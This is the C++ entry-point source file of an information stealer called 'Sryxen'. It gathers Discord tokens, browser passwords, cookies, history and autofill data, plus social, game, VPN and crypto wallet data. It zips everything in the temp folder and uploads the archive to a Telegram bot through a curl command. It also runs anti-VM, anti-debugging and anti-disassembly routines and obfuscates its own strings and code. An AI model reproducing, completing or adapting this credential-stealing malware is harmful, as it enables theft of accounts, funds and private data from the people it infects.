#include <iostream>
#include <fstream>
#include <chrono>
#include <vector>
#include <windows.h>
#include "discord.hpp"
#include "Segment_Encryption.h"
#include "Vectored_Exception_Handling.hpp"
#include "Browsers_EntryPoint.hpp"
#include "winapi_structs.hpp"
#include "EntryPoint_Socials.hpp"
#include "EntryPoint_Games.hpp"
#include "EntryPoint_VPN.hpp"
#include "Crypto-Exfil.hpp"
#include "obfusheader.h"
#include <string>
#include <cstdlib>
#include <locale>
#include <codecvt>
#include "Break_IDA_x64.hpp"
#include "Junk_Instructions.h"
#include "EntryPoint_AntiDebug.hpp"
#include "EntryPoint_AntiVM.hpp"
#include "Anti_Dissasembler.h"
//
//#include <filesystem>
//#include <sstream>

#pragma region TG_CONFIG
#define CHAT_ID OBF("%HAT%")
#define BOT_TOKEN OBF("%BOT_TOKEN%")
#pragma endregion TG_CONFIG


std::string GetUserNameStr() {
    char username[256];
    DWORD size = sizeof(username);

    BOOL success = CALL_EXPORT(L"advapi32.dll", "GetUserNameA", BOOL(WINAPI*)(LPSTR, LPDWORD), username, &size);

    if (success) {
        return std::string(username);
    }
    return "";
}


std::string GetDirectoryStructure(const std::string& folderPath) {
    std::string structure;
    for (const auto& entry : std::filesystem::directory_iterator(folderPath)) {
        if (std::filesystem::is_directory(entry.status())) {
            std::string relativePath = entry.path().string();
            size_t pos = relativePath.find("Sryxen");
            if (pos != std::string::npos) {
                relativePath = relativePath.substr(pos + std::string("Sryxen").length() + 1); 
                structure += relativePath + "\n"; 
            }
        }
    }
    return structure;
}


void CompressFolderToZip(const std::string& folderPath) {
    const char* tempEnv = getenv("TEMP");
    if (tempEnv == nullptr) {
        return;
    }

    std::string zipFileName = std::string(tempEnv) + "\\" + GetUserNameStr() + OBF("_SryxenRetrieved.zip");
    std::string command = OBF("powershell -Command Compress-Archive -Path \"") + folderPath + OBF("\" -DestinationPath \"") + zipFileName + OBF("\" >nul 2>&1");

    system(command.c_str());
}

std::vector<std::string> ConvertCookiesToStrings(const std::vector<Cookie>& cookies) {
    std::vector<std::string> result;
    for (const auto& cookie : cookies) {
        result.push_back(OBF("[Cookie] Site: ") + cookie.site + " | Name: " + cookie.name + " | Value: " + cookie.value);
    }
    return result;
}

std::vector<std::string> ConvertPasswordsToStrings(const std::vector<Password>& passwords) {
    std::vector<std::string> result;
    for (const auto& password : passwords) {
        result.push_back(OBF("[Password] Site: ") + password.site + " | Username: " + password.username + " | Password: " + password.password + " | Browser: " + password.browsername);
    }
    return result;
}

std::vector<std::string> ConvertHistoryToStrings(const std::vector<History>& historyEntries) {
    std::vector<std::string> result;
    for (const auto& entry : historyEntries) {
        result.push_back(OBF("[History] Title: ") + entry.title + " | URL: " + entry.url + " | Visits: " + std::to_string(entry.visit_count)
            + " | Last Visit: " + entry.last_visit_time);
    }
    return result;
}

std::vector<std::string> ConvertBookmarksToStrings(const std::vector<Bookmark>& bookmarks) {
    std::vector<std::string> result;
    for (const auto& bookmark : bookmarks) {
        result.push_back(OBF("[Bookmark] ") + bookmark.name + " -> " + bookmark.url + " (Added: " + bookmark.date_added + ")");
    }
    return result;
}

std::vector<std::string> ConvertAutofillToStrings(const std::vector<Autofill>& autofillEntries) {
    std::vector<std::string> result;
    for (const auto& autofill : autofillEntries) {
        result.push_back(OBF("[Autofill] Input: ") + autofill.input + " | Value: " + autofill.value);
    }
    return result;
}

void EnsureDirectoryExists(const std::string& dirPath) {
    CreateDirectoryA(dirPath.c_str(), NULL);
}

void SaveToFile(const std::string& filename, const std::vector<std::string>& data) {
    const char* tempEnv = getenv("TEMP");
    if (tempEnv == nullptr) {
        return;  
    }

    std::string tempPath = std::string(tempEnv) + OBF("\\Sryxen");  
    EnsureDirectoryExists(tempPath);
    std::string fullPath = tempPath + "\\" + filename;

    HANDLE hFile = HiddenCalls::CreateFileA(fullPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    std::string content = std::accumulate(data.begin(), data.end(), std::string(), [](const std::string& a, const std::string& b) { return a + b + "\n"; });
    DWORD bytesWritten;
    HiddenCalls::WriteFile(hFile, content.c_str(), content.size(), &bytesWritten, nullptr);
    HiddenCalls::CloseHandle(hFile);
}

std::wstring StringToWString(const std::string& str) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.from_bytes(str);
}

std::string WStringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

// 
template <typename String>
void SendFileWithTelegram(const String& zipFileName, const std::string& folderStructure) {
    std::string zipFileNameStr;

    if constexpr (std::is_same_v<String, std::wstring>) {
        zipFileNameStr = WStringToString(zipFileName);  
    }
    else {
        zipFileNameStr = zipFileName; 
    }

    std::string message = OBF("DIR: ") + folderStructure;

    std::replace(message.begin(), message.end(), '\n', ' ');  
    std::replace(message.begin(), message.end(), '\r', ' ');  


    std::string curlCommand = OBF("curl -F \"chat_id=") + std::string(CHAT_ID) + OBF("\" ")
        + OBF("-F \"document=@\\\"") + zipFileNameStr + OBF("\\\"\" ")
        + OBF("-F \"caption=") + message + OBF("\" ")
        + OBF("https://api.telegram.org/bot") + std::string(BOT_TOKEN) + OBF("/sendDocument");

    system(curlCommand.c_str());
}






__declspec(noinline) void* MainBlock() {
    BRKIDA;
    AddVectoredExceptionHandler(1, VectExceptionHandler);

    const char* tempEnv = getenv("TEMP");
    if (tempEnv == nullptr) {
        return nullptr;
    }
    SaveToFile(OBF("discord.txt"), Discord::GetTokens());
    SaveToFile(OBF("bookmarks.txt"), ConvertBookmarksToStrings(Browser::ExtractChromiumBookmarks()));
    SaveToFile(OBF("passwords.txt"), ConvertPasswordsToStrings(Browser::GetPasswords()));
    SaveToFile(OBF("history.txt"), ConvertHistoryToStrings(Browser::GetHistory()));
    SaveToFile(OBF("autofill.txt"), ConvertAutofillToStrings(Browser::GetAutofill()));
    SaveToFile(OBF("cookies.txt"), ConvertCookiesToStrings(Browser::GetCookies()));
    Socials::Run();
    Games::Extract();
    VPN::Extract();
    Wallets::Extract();
    std::string dirstrcuture = OBF("C:\\Users\\") + GetUserNameStr() + OBF("\\AppData\\Local\\Temp\\Sryxen");

    std::string folderStructureBefore = GetDirectoryStructure(dirstrcuture);

    std::string folderPath = OBF("C:\\Users\\") + GetUserNameStr() + OBF("\\AppData\\Local\\Temp\\Sryxen");
    CompressFolderToZip(folderPath);


    std::string zipFileName = OBF("C:\\Users\\") + GetUserNameStr() + OBF("\\AppData\\Local\\Temp\\") + GetUserNameStr() + OBF("_SryxenRetrieved.zip");

    SendFileWithTelegram(zipFileName, folderStructureBefore);



    return EndSED((void*)(0));
}



int main() {
   //BRKIDA;
   AddVectoredExceptionHandler(1, VectExceptionHandler);
   RunAllAntiVM();
   RunAllAntiDebug();
   RunAllAntiDisassmTechniques();
   
   EncryptFunction((uintptr_t)MainBlock);
   CallFunction(MainBlock);
    return 0;
}